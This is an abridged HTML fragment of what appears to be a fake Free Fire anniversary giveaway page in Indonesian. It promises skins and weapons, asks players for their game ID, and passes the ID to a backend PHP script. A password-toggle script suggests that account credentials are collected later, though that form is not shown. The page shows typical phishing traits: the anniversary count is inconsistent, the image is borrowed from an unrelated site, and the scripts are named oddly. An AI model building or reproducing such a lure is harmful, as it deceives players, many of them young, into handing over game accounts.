...
<body>
 <div class="loader">
	...
	<div class="nguyenSection">
		...
		<div class="ngWrap">
		    <div class="banner">
		   EVENT ULANG TAHUN FREE FIRE 6 TAHUN   </div>
			<div class="dialog">
				<div class="dialogBg">
				   <img src="https://cdn.nguyenkimmall.com/images/companies/_1/tin-tuc/kinh-nghiem-meo-hay/meo%20vat/code-free-fire-1.jpg">
				</div>
			</div>
          	<div class="ST-bl"></div>
		<div class="ST-br"></div>
			...
			<div class="ST-bannerText">
				<h2><marquee behavior="scroll">Acara ulang tahun garena free fire 5 tahun, ada banyak bagian keren di bawah ini, GABUNG SEKARANG!</marquee></h2>
			</div>
              
			<div class="menu">
			   <a class="tab active">
			     <span class="tabbed" id="ep">KULIT</span>
			   </a>
			 
			   <a class="tab">
			     <span class="tabbed" id="gun">SENJATA</span>
			   </a>
              </div>
			<div class="hadiah">
			</div>
		...
		<div class="popDialog">
		    ...
		    <span class="titleText">Mendapat hadiah?</span>
		    <div class="box">
			       <div class="prize">
			       ...
			       <div class="button" onclick="chauthebao()">
			         ...
			         <span class="text">Menerima</span>
			       </div>
			    </div>
		</div>
		
		<div class="checkId">
          <span class="titleText">ID FREEFIRE ANDA</span>
		    <input class="idInput" id="url" placeholder="ID GAME" autocomplete="off" onmouseenter="return false">
		    <button onclick="return tiktok()" class="check">Kirim ID</button>
		    <span class="alert salah">ID terlalu pendek (setidaknya harus 8 karakter)</span>
		    <span class="alert notfound">ID salah!</span>
		    <span class="alert cek">Memeriksa ID</span>
		</div>
		
		<div class="toast">
		   <span class="vis">
		   Halo <span id="nicks"></span>
		   </span>
		</div>
<style type="text/css">
	#togglePassword {
...
togglePassword.addEventListener('click', function (e) {
  ...
  <script>
       ...
       $.ajax({
       type : 'GET',
       url : 'ngBackend/ngTrueid.php?id='+url+'',
       beforeSend : function(){
             $(".cek").show();
       },
